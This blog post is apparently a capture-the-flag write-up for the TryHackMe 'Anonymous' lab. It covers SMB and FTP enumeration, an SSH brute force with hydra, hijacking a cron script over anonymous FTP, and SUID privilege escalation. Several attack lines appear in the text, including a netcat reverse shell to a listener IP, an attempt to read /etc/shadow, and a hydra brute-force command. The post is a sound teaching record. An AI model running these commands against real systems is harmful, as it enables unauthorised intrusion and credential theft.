---
layout: post
title:  TryHackMe - Anonymous
date:   2022-10-20 00:00:00 -0600
categories: THM
intro: This CTF is relatively straight forward, needing only SMB shares and an FTP server for the exploit.
---

# TryHackMe - Anonymous
This CTF is relatively straight forward, needing only SMB shares and an FTP server for the exploit. Let's begin with an nmap scan:
<br>
<p align="center"><img width="850" src="/assets/blog/THM-Anonymous/nmap.png"></p>
<br>
My initial thoughts when seeing Samba running over ports 139 and 445 was to further enumerate those services, which I did with `enum4linux -a 10.10.246.10`. Some of the questions for this CTF can be answered from the results:<br>
<p align="center"><img width="750" src="/assets/blog/THM-Anonymous/enum4linux.png"></p>
<br>
We can get access to the `pics` share and get the files within using the following commands:<br>
<p align="center"><img width="850" src="/assets/blog/THM-Anonymous/smbclient.png"></p>
<br>
I was expecting some kind of steganography to be used here but that doesn't seem to be the case, at least from what I saw. It's quite literally two images of dogs as the names indicate. I tried looking for hidden information within those files with several tools, I tried looking for `strings`, and lastly used `file` to try and get info, which revealed the following:<br>
<p align="center"><img width="900" src="/assets/blog/THM-Anonymous/examine_images.png"></p>
<br>
What this does give a couple of names that I can try and set up a ssh brute force for, namely "Denise Flaim" and "Susan Sprung". I wasn't sure if they were even users on this machine, but it doesn't hurt to start a brute force attack in the background. I created a rudimentary list of possible usernames which ended up as the following:<br>
```
dflaim
ssprung
deniseflaim
susansprung
denise
flaim
susan
sprung
```
If none of these work I can always add capitalized letters, etc. I then setup that brute force with hydra, which looked like this:<br>
<p align="center"><img width="850" src="/assets/blog/THM-Anonymous/hydra.png"></p>
<br>
While that was running I checked out the FTP server, which from the initial nmap scan I know allows anonymous login:
<p align="center"><img width="675" src="/assets/blog/THM-Anonymous/ftp.png"></p>
<br>
There are 3 files to get from there, only two of which are useful. The bash file is what is outputting data to the log file, and we can try and manipulate it for more info. Now instead of trying to guess possible usernames to run the password list against I uploaded the following with a simple `put` command to the ftp server, overwriting the `clean.sh` bash file:<br>
<p align="center"><img width="500" src="/assets/blog/THM-Anonymous/change_clean_sh.png"></p>
<br>
From the number of generated logs it's clear this task runs frequently, likely every minute. After a couple of minutes I downloaded the log file once more and got the contents of the `/home/` directory, aka what usernames I will need to target:<br>
<p align="center"><img width="500" src="/assets/blog/THM-Anonymous/username.png"></p>
<br>
Okay, so I can now stop my useless hydra attack and modify it to something that will actually hopefully work with `hydra -l namelessone -P /usr/share/wordlists/rockyou.txt 10.10.127.241 ssh`.<br><br>
While that was running I decided to keep after the script we can modify on the ftp server. I tried to read the `/etc/shadow` file to setup a John attack locally, however that didn't ouput anything to the log file (I'm guessing I lacked the permissions needed). After that I tried looking into the `namelessone`'s home folder with the following command:<br>
<p align="center"><img width="700" src="/assets/blog/THM-Anonymous/directory listing.png"></p>
<br>
This revealed a file called `user.txt` - our first flag. After editing that bash file with the following command `cat /home/namelessone/user.txt >> /var/ftp/scripts/removed_files.log`, it will eventually output the user flag:<br>
<p align="center"><img width="450" src="/assets/blog/THM-Anonymous/user flag.png"></p>
<br>
Now at this point the bruteforce had been running for some time with nothing useful. This made me think that the foothold is going to have to be through the ftp server as well, so I added a quick `which nc` and `which ncat` to see if netcat was installed on the system and once confirming it was installed at `/bin/nc` I added `/bin/nc 10.2.2.129 4444 -e /bin/sh` to try and start a reverse shell. Despite being installed, this didn't work and I don't know why. I tried adding a `sudo` at the front as well as confirming that bash was installed where it should be on the system, but nothing came from that. My firewall wasn't blocking anything that command would've needed and the port also wasn't otherwise in use.<br>
<br>
As a quick side note, I checked the crontab next with a `crontab -l` in the bash script and confirmed that it was running what I expected:<br>
<p align="center"><img width="700" src="/assets/blog/THM-Anonymous/the crontab.png"></p>
<br>
Well, with netcat not working I tried the `/dev/tcp` route which I got from [PenTestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). For whatever reason (the issue still wasn't the port), our nc listener now lights up with that reverse shell:<br>
<p align="center"><img width="750" src="/assets/blog/THM-Anonymous/nc_listener.png"></p>
<br>
I tried a `sudo -l` which did not help, and after checking for SUID permissions it returned a massive list that would have taken a long time to sift through manually. I found [this page](https://null-byte.wonderhowto.com/how-to/find-exploit-suid-binaries-with-suid3num-0215789/), which has a script that will automatically search for anything in that list that might be vulnerable. This is similar to the LinEnum script I have mentioned on previous posts.<br><br>
Following their steps I downloaded their `.py` file (I had also previously confirmed python was installed on this system), and after starting a web server on our local machine we can download the script onto the target machine:<br>
<p align="center"><img width="750" src="/assets/blog/THM-Anonymous/download_from_webserver.png"></p>
<br>
I did try curling the raw file from GitHub to the target machine without success. The above method with hosting the web server locally and then getting the script to the target machine worked without issue. Running that script with a quick `python suid3num.py` will show the following at the bottom of the results:
<p align="center"><img width="700" src="/assets/blog/THM-Anonymous/results.png"></p>
<br>
Given the scripts' recommendation I went ahead and tried that command and confirmed I did now have root permissions. Most root flags are found in the same place for these CTFs, so I guessed it's location next and was able to read the contents of the root flag:
<p align="center"><img width="500" src="/assets/blog/THM-Anonymous/root_flag.png"></p>
<br>
That's all folks. Cheers,<br><br>
Wes
